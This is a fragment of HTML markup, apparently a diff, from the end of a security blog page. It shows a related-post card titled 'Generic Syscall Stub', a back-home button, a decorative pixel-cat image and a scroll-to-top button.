+            <a href="https://at0mxploit.xyz/post/generic-syscall-stub" data-post-link="generic-syscall-stub" data-related-link="" class="group relative block bg-gray-900/60 border-8 border-black p-8 md:p-10 hover:bg-gray-900/80 transition-all hover:scale-[1.01] animate-fade-in shadow-[10px_10px_0px_0px_rgba(0,0,0,1)]">
+              <div class="relative z-10 flex items-start gap-6">
+                <div class="flex-1">
+                <div class="flex items-center gap-3 mb-5 flex-wrap">
+                  <div class="bg-black border-2 border-white px-3 py-1">
+                    <span class="text-white font-black text-xs uppercase">1 shared tag</span>
+                  </div>
+                  <div class="bg-pink-400 border-4 border-black px-3 py-1 rotate-[-2deg]">
+                    <span class="text-black font-black text-xs uppercase">Blogs</span>
+                  </div>
+                </div>
+                <h3 class="text-2xl md:text-3xl font-black text-white mb-4 leading-tight group-hover:scale-[1.01] transition-transform" style="text-shadow:3px 3px 0px rgba(0,0,0,0.5)">Generic Syscall Stub</h3>
+                <p class="text-base text-gray-200 font-bold leading-relaxed">Instead of writing a separate stub per syscall, one generic stub that handles every single Nt* function, continuation of Syscalls Demystified.</p>
+                </div>
+                <div class="flex-shrink-0 bg-pink-400 border-4 border-black w-14 h-14 flex items-center justify-center group-hover:scale-110 group-hover:rotate-12 transition-all shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]">
+                  <span class="text-black font-black text-2xl">→</span>
+                </div>
+              </div>
+            </a>
+          
+        </div>
+      </div>
+    </section>
+  
+        <div class="mt-12 text-center">
+          <a href="https://at0mxploit.xyz/" data-home-link="" data-tilt="" data-tilt-lift="translateY(-4px)" class="inline-block bg-yellow-400 border-8 border-black px-12 py-5 shadow-[10px_10px_0px_0px_rgba(0,0,0,1)] hover:shadow-[14px_14px_0px_0px_rgba(0,0,0,1)] hover:translate-x-[-4px] hover:translate-y-[-4px] transition-all rotate-[-2deg] hover:rotate-0" data-tilt-bound="true" data-base-transform="" style="transform-style: preserve-3d; will-change: transform; transition: transform 160ms;">
+            <span class="font-black text-2xl text-black uppercase">BACK HOME →</span>
+          </a>
+        </div>
+      </div>
+    </article>
+  </div></main></div></div>
+    
+  
+
+<div class="neko" style="position: fixed; width: 32px; height: 32px; image-rendering: pixelated; pointer-events: auto; cursor: pointer; z-index: 999999; left: 657px; top: 721px; margin: 0px; padding: 0px; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; background: transparent; overflow: visible; box-sizing: border-box; user-select: none;"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA70lEQVR4nO1Wyw7DMAgr0/7/l73LmAglBJNKU6X6VDUBm0dCjuPBDYHN9QEvlhxARrJa3xagLBGJklNgBJQJmCy0MhCQtKJnBGQE4UI1C++igJi5GbVFqwQiQv2/XMCVuKeAWe07PUE1oa2xkonI8M2KYbqGOutfMUv/TAmk2uVV8vImh18abEacuLLfzkWkzqN60AF1j+GpH9gxvCNg2owdEd0HSbaBElERAMYha7sSAABpVMnRXNquBAzpjm67TFBgG4qgeoB8kpWQ3gNRNCxcxrwjmQlAhVid24F0chQMLWOPWUGZkIXc720f/BcfQ6ib3RoDepoAAAAASUVORK5CYII=" style="width: 100%; height: 100%; background: transparent; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; margin: 0px; padding: 0px; max-width: none; max-height: none; display: block; box-sizing: border-box; user-select: none; -webkit-user-drag: none; pointer-events: none;"></div><button type="button" data-scroll-top-btn-global="true" aria-label="Scroll to top" title="Scroll to top" class="fixed bottom-6 right-6 z-[9999] bg-yellow-400 border-4 border-black w-14 h-14 flex items-center justify-center shadow-[6px_6px_0px_0px_rgba(0,0,0,1)] hover:shadow-[8px_8px_0px_0px_rgba(0,0,0,1)] hover:translate-x-[-2px] hover:translate-y-[-2px] transition-all"><span class="text-black font-black text-2xl">↑</span></button></body></html>
